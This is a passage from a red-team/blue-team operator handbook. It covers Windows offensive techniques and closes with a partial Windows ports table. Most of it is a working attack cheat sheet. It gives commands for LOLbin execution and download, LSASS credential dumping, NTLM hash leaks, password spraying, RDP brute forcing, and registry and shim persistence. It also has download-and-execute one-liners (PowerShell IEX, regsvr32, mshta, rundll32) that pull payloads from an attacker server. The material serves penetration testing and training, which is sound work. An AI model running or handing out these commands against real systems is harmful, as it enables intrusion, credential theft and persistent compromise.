https://www.sans.org/security-resources/posters/windows-forensic-
analysis/170/download?utm_source=share&utm_medium=ios_app&utm_name=iossmf 
https://cqureacademy.com/blog/forensics/what-to-do-after-hack-5-unusual-
places-where-you-can-find-evidence 
https://0xdf.gitlab.io/2018/11/08/powershell-history-file.html 
https://www.blackbagtech.com/blog/windows-10-jump-list-forensics/ 
https://www.linkedin.com/pulse/windows-10-microsoft-edge-browser-forensics-
brent-muir 
https://github.com/Cugu/awesome-forensics 
https://github.com/meirwah/awesome-incident-response#windows-evidence-
collection 
https://www.jpcert.or.jp/present/2018/20171109codeblue2017_en.pdf 
W
W 
WINDOWS_Exploit 
RED TEAM 
EXPLOITATION 
WINDOWS 
WINDOWS LOLbins 
LoLBin is any binary supplied by the operating system that is 
normally used for legitimate purposes but can also be abused by 
malicious actors. Several default system binaries have unexpected 
side effects, which may allow attackers to hide their activities 
post-exploitation 
EXECUTE LOLbins 
at.exe at 07:30 /interactive /every:m,t,w,th,f,s,su 
C:\Windows\System32\example.exe 
354 
Atbroker.exe /start example.exe 
bash.exe -c example.exe 
bitsadmin /CREATE 1 & bitsadmin /ADDFILE 1 
c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin 
/SetNotifyCmdLine 1 c:\data\playfolder\cmd.exe NULL & bitsadmin 
/RESUME 1 & bitsadmin /RESET 
rundll32.exe zipfldr.dll,RouteTheCall example.exe 
dotnet.exe \path\to\example.dll 
wsl.exe -e /mnt/c/Windows/System32/example.exe 
DOWNLOAD LOLbins 
bitsadmin /CREATE 1 bitsadmin /ADDFILE 1 
https://live.sysinternals.com/autoruns.exe 
c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin 
/COMPLETE 1  
certutil.exe -urlcache -split -f http:///example.exe 
example.exe 
Excel.exe http:///example.dll 
#Places download in cache folder 
Powerpnt.exe http:///example.dll 
#Places download in cache folder 
hh.exe http://\path\example.exe c:\path\outdir /A 
COPY LOLbins 
esentutl.exe /y C:\path\dir\src_example.vbs /d 
C:\path\dir\dst_example.vbs /o 
expand c:\path\dir\src_example.bat c:\path\dir\dst_example.bat 
replace.exe C:\path\dir\example.txt C:\path\outdir\ /A 
ENCODE LOLbins 
certutil -encode input_example.txt encoded_example.txt 
355 
DECODE LOLbins 
certutil -decode encoded_example.txt output_example.txt 
APPLICATION WHITELIST BYPASS LOLbins 
bash.exe -c example.exe 
#Executes click-once-application from  
rundll32.exe dfshim.dll,ShOpenVerbApplication 
http:///application/?param1=foo 
#Execute the specified remote .SCT script with scrobj.dll. 
regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll 
#Execute the specified local .SCT script with scrobj.dll. 
regsvr32.exe /s /u /i:file.sct scrobj.dll 
CREDENTIALS LOLbins 
#List cached credentials: 
cmdkey /list 
#Export plaintext local wireless passwords: 
netsh wlan export profile key=clear 
COMPILE LOLbins 
csc.exe -out:example.exe file.cs 
csc.exe -target:library -out:example.dll file.cs 
#compile javascript code in scriptfile.js & output scriptfile.exe. 
jsc.exe scriptfile.js 
HASH LEAK LOLbins 
DOS COMMANDS 
Various Windows commands can allow you to illicit an NTLMv1/v2 
authentication leak. Their usefulness in an actual scenario I’ll 
leave up to the user. 
C:\> dir \\\C$ 
C:\> regsvr32 /s /u /i:///blah example.dll 
C:\> echo 1 > ///blah 
C:\> pushd \\\C$\blah 
C:\> cmd /k \\\C$\blah 
C:\> cmd /c \\\C$\blah 
C:\> start \\\C$\blah 
C:\> mkdir \\\C$\blah 
C:\> type \\\C$\blah 
C:\> rpcping -s  -e 1234 -a privacy -u NTLM 
POWERSHELL COMMANDS 
356 
Various Windows PowerShell commands can allow you to illicit an 
NTLMv1/v2 authentication leak. Their usefulness in a scenario I’ll 
leave up to the user. 
PS> Invoke-Item \\\C$\blah 
PS> Get-Content \\\C$\blah 
PS> Start-Process \\\C$\blah 
DUMP LOLbins 
#dump LSASS with rundll32 
rundll32.exe C:\Windows\System32\comsvcs.dll #24 " lsass.dmp 
full" 
rundll32.exe comsvcs.dll #24 " lsass.dmp full" 
#dump process pid; requires administrator privileges 
tttracer.exe -dumpFull -attach  
#diskshadow to exfiltrate data from VSS such as NTDS.dit 
diskshadow.exe /s c:\test\diskshadow.txt 
REFERENCE: 
https://lolbas-project.github.io/# 
WINDOWS PRIVILEGE ESCALATION 
Groups on Target System 
net localgroup 
Get-LocalGroup | ft Name 
Users in Administrators Group 
net localgroup Administrators 
Get-LocalGroupMember Administrators | ft Name, PrincipalSource 
User Autologon Registry Entries 
reg query "HKLM\SOFTWARE\Microsoft\Windows 
NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName 
DefaultDomainName DefaultPassword" 
Get-ItemProperty -Path 
'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows 
NT\CurrentVersion\WinLogon' | select "Default*" 
List Credential Manager Cache/Locations 
cmdkey /list 
dir C:\Users\username\AppData\Local\Microsoft\Credentials\ 
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\ 
Get-ChildItem -Hidden 
C:\Users\username\AppData\Local\Microsoft\Credentials\ 
357 
Get-ChildItem -Hidden 
C:\Users\username\AppData\Roaming\Microsoft\Credentials\ 
Identify if Target User can access SAM and SYSTEM files 
%SYSTEMROOT%\repair\SAM 
%SYSTEMROOT%\System32\config\RegBack\SAM 
%SYSTEMROOT%\System32\config\SAM 
%SYSTEMROOT%\repair\system 
%SYSTEMROOT%\System32\config\SYSTEM 
%SYSTEMROOT%\System32\config\RegBack\system 
Weak folder permissions: Full Permissions Everyone/Users 
icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr 
"Everyone" 
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr 
"Everyone" 
icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr 
"BUILTIN\Users" 
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr 
"BUILTIN\Users"  
Weak folder permissions: Modify Permissions Everyone/Users 
icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr 
"Everyone" 
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr 
"Everyone" 
icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr 
"BUILTIN\Users"  
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr 
"BUILTIN\Users"  
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % 
{ try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select 
-ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}  
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % 
{ try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select 
-ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch 
{}} 
Processes and services 
tasklist /svc 
tasklist /v 
net start 
sc query 
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name 
-notlike "svchost*"} | Select Name, Handle, 
@{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize 
358 
Unquoted service paths 
wmic service get name,displayname,pathname,startmode 2>nul |findstr 
/i "Auto" 2>nul |findstr /i /v "C:\Windows\\" 2>nul |findstr /i /v 
""" 
gwmi -class Win32_Service -Property Name, DisplayName, PathName, 
StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -
notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select 
PathName,DisplayName,Name 
Scheduled Tasks 
schtasks /query /fo LIST 2>nul | findstr TaskName 
dir C:\windows\tasks 
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft 
TaskName,TaskPath,State 
Startup Items 
wmic startup get caption,command 
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run 
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce 
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run 
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce 
dir "C:\Documents and Settings\All Users\Start 
Menu\Programs\Startup" 
dir "C:\Documents and Settings\%username%\Start 
Menu\Programs\Startup" 
Get-CimInstance Win32_StartupCommand | select Name, command, 
Location, User | fl 
Get-ItemProperty -Path 
'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVer
sion\Run' 
Get-ItemProperty -Path 
'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVer
sion\RunOnce' 
Get-ItemProperty -Path 
'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVers
ion\Run' 
Get-ItemProperty -Path 
'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVers
ion\RunOnce' 
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup" 
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup" 
Network Configuration 
ipconfig /all 
route print 
359 
arp -a 
netstat -ano 
file C:\WINDOWS\System32\drivers\etc\hosts 
netsh firewall show state 
netsh firewall show config 
netsh advfirewall firewall show rule name=all 
netsh dump 
Get-NetIPConfiguration | ft 
InterfaceAlias,InterfaceDescription,IPv4Address 
Get-DnsClientServerAddress -AddressFamily IPv4 | ft 
Get-NetRoute -AddressFamily IPv4 | ft 
DestinationPrefix,NextHop,RouteMetric,ifIndex 
Get-NetNeighbor -AddressFamily IPv4 | ft 
ifIndex,IPAddress,LinkLayerAddress,State 
SNMP Configuration 
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s 
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -
Recurse 
Registry Passwords 
reg query HKCU /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
Image Build Artifacts Credentials 
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml 
*unattend.txt 2>nul 
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -
Recurse -ErrorAction SilentlyContinue | where {($_.Name -like 
"*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")} 
User Directories Search Passwords 
dir C:\Users\\ /s *pass* == *vnc* == *.config* 2>nul 
findstr C:\Users\ /si password *.xml *.ini *.txt *.config 2>nul 
Get-ChildItem C:\* -include *.xml,*.ini,*.txt,*.config -Recurse -
ErrorAction SilentlyContinue | Select-String -Pattern "password" 
Get-ChildItem –Path C:\Users\ -Include *password*,*vnc*,*.config -
File -Recurse -ErrorAction SilentlyContinue 
WindowsEnum 
https://github.com/absolomb/WindowsEnum 
360 
A PowerShell Privilege Escalation Enumeration Script. This script 
automates most of what is detailed in 
https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-
Guide/. 
#Quick standard checks. 
.\WindowsEnum.ps1 
#Directly from Terminal 
powershell -nologo -executionpolicy bypass -file WindowsEnum.ps1 
#Extended checks: search config files, interesting files, & 
passwords (be patient). 
.\WindowsEnum.ps1 extended 
#Directly from Terminal 
powershell -nologo -executionpolicy bypass -file WindowsEnum.ps1 
extended  
Windows Exploit Suggester - Next Generation (WES-NG) 
https://github.com/bitsadmin/wesng 
WES-NG is a tool based on the output of Windows' systeminfo utility 
which provides the list of vulnerabilities the OS is vulnerable to, 
including any exploits for these vulnerabilities. Every Windows OS 
between Windows XP and Windows 10, including their Windows Server 
counterparts, is supported. 
#Obtain the latest database of vulnerabilities by executing the 
command: 
wes.py --update. 
#Use Windows' built-in systeminfo.exe tool on target host, or 
remote system using systeminfo.exe /S MyRemoteHost ;to a file: 
#Local 
systeminfo > systeminfo.txt 
#Remote 
systeminfo.exe /S MyRemoteHost > systeminfo.txt 
#To determine vulns execute WES-NG with the systeminfo.txt output 
file:  
wes.py systeminfo.txt 
#To validate results use --muc-lookup parameter to validate 
identified missing patches against Microsoft's Update Catalog. 
361 
Windows Scheduler SYSTEM Privilege Escalation Technique 
$> net use \\[TargetIP]\ipc$ password /user:username 
$> net time \\[TargetIP] 
$> at \\[TargetIP] 12:00 pm tftp -I [MyIP] GET nc.exe 
OR 
$> at \\[TargetIP] 12:00 pm C:\Temp\payload.exe 
PowerSploit 
https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc 
#Copy Privesc folder to PowerShell module directory. To find the 
directory execute $Env:PSModulePath 
#Import the module 
Import-Module Privesc 
#To run all privesc checks on the system 
Invoke-AllChecks 
Simple One-liner Password Spraying 
#First get users on the domain into a textfile: 
net user /domain > users.txt 
#Echo passwords into a file: 
echo “password1” >> passwords.txt 
echo “Spring2020” >> passwords.txt 
#One-liner script to spray passwords.txt against users.txt: 
@FOR /F %n in (users.txt) DO @FOR /F %p in (passwords.txt) DO @net 
use \\[DOMAINCONTROLLER]\IPC$ /user:[DOMAIN]\%n %p 1>NUL 2>&1 && 
@echo [*] %n:%p && @net use /delete \\[DOMAINCONTROLLER]\IPC$ > 
NULL 
362 
Windows OS Command Injection 
https://github.com/payloadbox/command-injection-payload-
list/blob/master/README.md 
Export Plaintext Local Wireless Passwords 
$> netsh wlan export profile key=clear 
Search local system for passwords 
$> findstr /si pass *.xml | *.doc | *.txt | *.xls | *.cfg 
$> ls -R | select-string -Pattern password 
REFERENCE: 
!!!BEST!!!-> https://www.absolomb.com/2018-01-26-Windows-Privilege-
Escalation-Guide/ 
https://github.com/sagishahar/lpeworkshop 
https://github.com/absolomb/WindowsEnum 
https://github.com/J3wker/windows-privilege-escalation-cheat-sheet 
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology
%20and%20Resources/Windows%20-%20Privilege%20Escalation.md 
https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-
unquoted-service-path-c7a011a8d8ae 
RDP EXPLOITATION 
XFREERDP -Simple User Enumeration Windows Target (kerberos based) 
# Syntax = xfreerdp /v: -sec-nla /u:"" 
xfreerdp /v:192.168.0.32 -sec-nla /u:"" 
XFREERDP - Login 
#Syntax = xfreerdp /u: /g: /p: /v: 
xfreerdp /u: /g: /p: /v:192.168.1.34 
NCRACK - Wordlist based bruteforce RDP 
https://nmap.org/ncrack/ 
ncrack -vv --user/-U  --pass/-P 
 -s :3389 
ncrack -vv --user  -P wordlist.txt -s 192.168.0.32:3389 
CROWBAR - Bruteforce Tool 
https://github.com/galkan/crowbar 
crowbar.py -b rdp -U user/user_wordlist> -C 
 -s /32 -v 
crowbar.py -b rdp -u user -C password_wordlist -s /32 -v 
#To use username with a DOMAIN 
363 
crowbar.py -b rdp -u \\ -c  -s 10.68.35.150/32 
WINDOWS PERSISTENCE 
SC Service Creation 
sc create newservice type= own type= interact binPath= 
“C:\windows\system32\cmd.exe /c payload.exe" & sc start newservice 
Winlogon Helper DLL Shell 
Requires modifications of the following registry keys: 
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows 
NT\CurrentVersion\Winlogon\Shell 
#Modify registry with below commands: 
reg add "HKLM\Software\Microsoft\Windows 
NT\CurrentVersion\Winlogon" /v Shell /d "explorer.exe, payload.exe" 
/f 
OR PowerShell 
Set-ItemProperty "HKLM:\Software\Microsoft\Windows 
NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, payload.exe" -
Force 
Winlogon Helper DLL UserInit 
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows 
NT\CurrentVersion\Winlogon\Userinit 
#Modify registry with below commands: 
reg add "HKLM\Software\Microsoft\Windows 
NT\CurrentVersion\Winlogon" /v Userinit /d "Userinit.exe, 
payload.exe" /f 
#Or PowerShell 
Set-ItemProperty "HKLM:\Software\Microsoft\Windows 
NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, payload.exe" 
-Force 
Winlogon GP Extensions 
HKLM\SOFTWARE\Microsoft\Windows 
NT\CurrentVersion\Winlogon\GPExtensions\{GUID}\DllName= 
OMA Client Provisioning dmcfghost.exe 
HKLM\SOFTWARE\Microsoft\PushRouter\Test\TestDllPath2= 
Werfault.exe Reflective Debugger 
#Add Run key to executable 
HKLM\Software\Microsoft\Windows\Windows Error 
Reporting\Hangs\ReflectDebugger= 
#Launch  
werfault.exe -pr 1 
364 
OffloadModExpo Function 
HKLM\Software\Microsoft\Cryptography\Offload\ExpoOffload= 
DiskCleanup CleanupMgr 
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\
cleanuppath = %SystemRoot%\System32\payload.exe 
Application Shim DLL Injection 
#Use Microsoft Application Compatibility Toolkit (ACT) to build a 
shim> https://docs.microsoft.com/en-
us/windows/deployment/planning/compatibility-administrator-users-
guide 
#Create shim for a known application on the target host. 
Navigate to the following (doesn’t have to be built/done on target 
host: 
Create New Compatibility Fix -> RedirectEXE -> Parameters -> 
Command Line -> C:\path\to\local\payload.dll -> OK -> Next -> 
Finish 
#Save as Shim database file .sdb 
#Then install shim on target host via:  
sbdinst.exe payload.sdb 
#The .sdb file can then be deleted. 
Application Shim Redirect EXE 
#Use Microsoft Application Compatibility Toolkit (ACT) to build a 
shim> https://docs.microsoft.com/en-
us/windows/deployment/planning/compatibility-administrator-users-
guide 
#Place a malicious payload on a share in the target network. 
#Create shim for a known application on the target host. 
Navigate to the following (doesn’t have to be built/done on target 
host: 
Create New Compatibility Fix -> InjectDll -> Parameters -> Command 
Line -> \\10.10.0.1\path\to\payload.exe -> OK -> Next -> Finish 
#Save as Shim database file .sdb 
#Then install shim on target host via:  
sbdinst.exe payload.sdb 
#The .sdb file can then be deleted. 
VMware Tools BAT File Persistence 
#Add command into one or more of the following: 
C:\Program Files\VMware\VMware Tools\poweroff-vm-default.bat 
C:\Program Files\VMware\VMware Tools\poweron-vm-default.bat 
C:\Program Files\VMware\VMware Tools\resume-vm-default.bat 
365 
C:\Program Files\VMware\VMware Tools\suspend-vm-default.bat 
RATTLER - Tool to identify DLL Hijacks 
https://github.com/sensepost/rattler 
REFERENCE: 
http://www.hexacorn.com/blog/2018/10/page/4/ 
http://www.hexacorn.com/blog/2013/12/08/beyond-good-ol-run-key-part-5/ 
http://www.hexacorn.com/blog/2018/08/31/beyond-good-ol-run-key-part-85/ 
https://pentestlab.blog/2020/01/14/persistence-winlogon-helper-dll/ 
https://liberty-shell.com/sec/2020/02/25/shim-persistence/ 
https://www.youtube.com/watch?v=LOsesi3QkXY 
https://pentestlab.blog/tag/persistence/ 
Twitter -> @subTee 
COMMAMD & CONTROL  
C2 Matrix 
It is the golden age of Command and Control (C2) frameworks. The 
goal of this site is to point you to the best C2 framework for your 
needs based on your adversary emulation plan and the target 
environment. Take a look at the matrix or use the questionnaire to 
determine which fits your needs. 
https://www.thec2matrix.com/ 
MORE WINDOWS LOLBIN DOWNLOAD OPTIONS 
POWERSHELL 
powershell.exe -w hidden -nop -ep bypass -c "IEX ((new-object 
net.webclient).downloadstring('http://[domainname|IP]:[port]/[file]
'))" 
#OR 
powershell -exec bypass -c "(New-Object 
Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetw
orkCredentials;iwr('http://webserver/payload.ps1')|iex" 
#OR 
powershell -exec bypass -f \\webdavserver\folder\payload.ps1 
#File written to WebDAV Local Cache 
CMD 
cmd.exe /k < \\webdavserver\folder\batchfile.txt 
#File written to WebDAV Local Cache 
Cscript/Wscript 
cscript //E:jscript \\webdavserver\folder\payload.txt 
#File written to WebDAV Local Cache 
MSHTA 
366 
mshta 
vbscript:Close(Execute("GetObject(""script:http://webserver/payload
.sct"")")) 
#File written to IE Local Cache 
OR 
mshta \\webdavserver\folder\payload.hta 
#File written to WebDAV Local Cache 
RUNDLL32 
rundll32.exe 
javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http
://webserver/payload.sct");window.close(); 
#File written to IE Local Cache 
#OR 
rundll32 \\webdavserver\folder\payload.dll,entrypoint 
#File written to WebDAV Local Cache 
WMIC   
wmic os get /format:"https://webserver/payload.xsl" 
#File written to IE Local Cache 
REGSVR32 
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll 
#File written to WebDAV Local Cache 
#OR 
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll 
#File written to WebDAV Local Cache 
ODBCCONF 
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt} 
#File written to WebDAV Local Cache 
REFERENCE: 
https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-
remote-payload-and-execute-arbitrary-code/ 
https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet#ais-
anchor 
https://artkond.com/2017/03/23/pivoting-guide/ 
https://morph3sec.com/2019/07/16/Windows-Red-Team-Cheat-Sheet/ 
W
W 
WINDOWS_Hardening 
BLUE TEAM 
CONFIGURATION 
WINDOWS 
367 
WINDOWS HARDENING GUIDE 
https://github.com/decalage2/awesome-security-hardening#windows 
WINDOWS 10 HARDENING GUIDE 
https://github.com/0x6d69636b/windows_hardening/blob/master/windows
_10_hardening.md 
W
W 
WINDOWS_Ports 
ALL 
INFORMATIONAL 
WINDOWS 
Historical Windows services and ports for all versions. 
DEFAULT DYNAMIC PORT RANGES: 
Windows Vista and later Range= 49152-65535 
Windows 2000, XP, and Server 2003 Range= 1025-5000 
PORT 
APP_PROTO 
SYSTEM SERVICE 
7 
TCP 
Echo 
Simple TCP/IP Services 
7 
UDP 
Echo 
Simple TCP/IP Services 
9 
TCP 
Discard 
Simple TCP/IP Services 
9 
UDP 
Discard 
Simple TCP/IP Services 
13 
TCP 
Daytime 
Simple TCP/IP Services 
13 
UDP 
Daytime 
Simple TCP/IP Services 
17 
TCP 
Quotd 
Simple TCP/IP Services 
17 
UDP 
Quotd 
Simple TCP/IP Services 
19 
TCP 
Chargen 
Simple TCP/IP Services 
19 
UDP 
Chargen 
Simple TCP/IP Services 
20 
TCP 
FTP default data 
FTP Publishing Service 
21 
TCP 
FTP control 
FTP Publishing Service 
21 
TCP 
FTP control 
Application Layer Gateway 
Service 
23 
TCP 
Telnet 
Telnet 
25 
TCP 
SMTP 
Simple Mail Transfer 
Protocol 
25 
TCP 
SMTP 
Exchange Server 
42 
TCP 
WINS Replication 
Windows Internet Name 
Service 
42 
UDP 
WINS Replication 
Windows Internet Name 
Service 
53 
TCP 
DNS 
DNS Server 
53 
UDP 
DNS 
DNS Server 
67 
UDP 
DHCP Server 
DHCP Server 
69 
UDP 
TFTP 